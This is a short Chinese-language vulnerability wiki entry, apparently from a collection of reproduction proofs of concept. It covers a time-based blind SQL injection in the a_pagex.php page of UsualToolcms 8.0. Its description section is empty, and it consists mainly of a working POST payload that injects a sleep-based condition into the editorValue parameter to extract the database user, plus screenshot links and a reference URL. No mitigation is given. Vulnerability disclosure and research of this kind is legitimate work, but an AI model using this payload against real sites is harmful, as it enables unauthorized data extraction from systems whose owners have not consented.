UsualToolcms 8.0 a\_pagex.php盲注
=================================

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

### poc

![1.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_pagex.php盲注/media/rId25.png)

    pagename=test&istop=0&isbottom=0&title=test&webkey=test&description=test&editorValue=1'and if(ascii(substr(user(),1,1))=100,sleep(2),1)#&id=2&submit=%E7%BC%96%E8%BE%91

editorValue参数需要手动添加

![2.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_pagex.php盲注/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
